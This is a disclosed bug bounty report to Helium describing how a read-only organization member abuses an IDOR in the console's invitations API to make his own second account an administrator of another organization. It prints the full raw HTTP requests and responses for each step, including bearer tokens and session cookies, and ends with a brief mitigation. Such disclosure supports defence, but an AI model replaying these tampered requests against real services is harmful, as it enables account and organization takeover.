# Organization Takeover via invitation API

## Report Details
- **Report ID**: 835005
- **URL**: https://hackerone.com/reports/835005
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-03-31T02:05:09.252Z
- **Disclosed**: 2020-05-27T20:51:32.273Z

## Reporter
- **Username**: azraelsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: helium

## Vulnerability Information
Hello @helium,
today I would like to show you how a malicious user could exploit an IDOR affecting the `/invitations` resource to gain Administrator privileges inside an organization of which he's part of as a reader.

# Steps to reproduce the bug
## Setup
Let's assume that three accounts exist:
- `azraelsec@wearehackerone.com` **[Attacker]**
- `azraelsec+test@wearehackerone.com` **[Victim]**
- `azraelsec+1@wearehackerone.com` **[Attacker's fake account]**

**Initial Context**: **[Victim]** is Administrator of the `target` organization on Helium Console and invites **[Attacker]** to join it as a reader.
**Goal**: **[Attacker]** escalate its privileges and becomes Administrator of the `target` organization

## Attack
1) **[Attacker]** makes a graphql query to leak the organization's id (using graphql it's only possible to see the memberships of the current organization):
```
POST /graphql HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 469
accept: */*
Sec-Fetch-Dest: empty
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
content-type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/dashboard
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4NjQwNDMsImV2ZW50SWQiOjU2MywiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6NjczfQ==

{"operationName":"PaginatedOrganizationsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n  organizations(page: $page, pageSize: $pageSize) {\n    entries {\n      ...OrganizationFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment OrganizationFragment on Organization {\n  id\n  name\n  inserted_at\n  __typename\n}\n"}
```
```
HTTP/1.1 200 OK
Date: Tue, 31 Mar 2020 01:07:44 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 57c62cdb39b0be28-MXP
Content-Length: 401

{"data":{"organizations":{"__typename":"PaginatedOrganizations","entries":[{"__typename":"Organization","id":"883b0a46-e4cf-4315-af4f-4226d1ada561","inserted_at":"2020-03-31T00:58:34","name":"lol"},{"__typename":"Organization","id":"cb23000e-65b3-4628-9ede-656ffa0d5aa8","inserted_at":"2020-03-31T01:05:42","name":"target"}],"pageNumber":null,"pageSize":null,"totalEntries":null,"totalPages":null}}}
```
**NOTE**: the `target` organization's id is `cb23000e-65b3-4628-9ede-656ffa0d5aa8`

2) Using its own organization's page **[Attacker]** makes a request to the `/api/invitations` end-point in order to add **[Attacker's fake account]** to it in the role of *admin* and intercepts this request through Burp Suite. It looks like this:
```
POST /api/invitations HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 125
Accept: application/json, text/plain, */*
Sec-Fetch-Dest: empty
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-Type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4OTQ2OTYsImV2ZW50SWQiOjU2NiwiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6Njc2fQ==

{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"883b0a46-e4cf-4315-af4f-4226d1ada561"}}
```
3) **[Attacker]** now only needs to change the organization field's value inserting the `target` one:
```
POST /api/invitations HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 126
Accept: application/json, text/plain, */*
Sec-Fetch-Dest: empty
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36
Content-Type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://console.helium.com/users
Accept-Encoding: gzip, deflate
Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; __cfduid=dfe09d09943b9f82399b493143e78867f1585613806; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI4ZjVhYmUxOS0wMDAxLTQxYjUtYTk2OS1mZTBiNzFkY2NmMWYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODU2MTM4MDkxNzMsImxhc3RFdmVudFRpbWUiOjE1ODU2MTY4OTQ2OTYsImV2ZW50SWQiOjU2NiwiaWRlbnRpZnlJZCI6MTEwLCJzZXF1ZW5jZU51bWJlciI6Njc2fQ==

{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"cb23000e-65b3-4628-9ede-656ffa0d5aa8"}}
```
```
HTTP/1.1 201 Created
Date: Tue, 31 Mar 2020 01:08:59 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 115
Connection: close
Cache-Control: max-age=0, private, must-revalidate
Message: User added to organization
Strict-Transport-Security: max-age=31536000
Via: 1.1 vegur
CF-Cache-Status: DYNAMIC
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 57c62eaa4ccde903-MXP

{"id":"a0262e0c-7939-42dd-a4ec-e42dc2eeaeab","joined_at":"2020-03-31T01:08:59","role":"admin","type":"memberships"}
```
4) Now **[Attacker's fake account]** has got full privileges on the `target` organization and can properly change **[Attacker]**'s role to Administrator and he can delete the original owner.

# Mitigations
To be sure that the requesting user is an Administrator of that organization is enough to solve this issue.

## Impact

This vulnerability has got a great impact on the platform as it allows any user to gain Administrator privileges on organizations he's part of, full controlling it.

## Attachments
- Organization_Takeover_via_Invitations.mp4
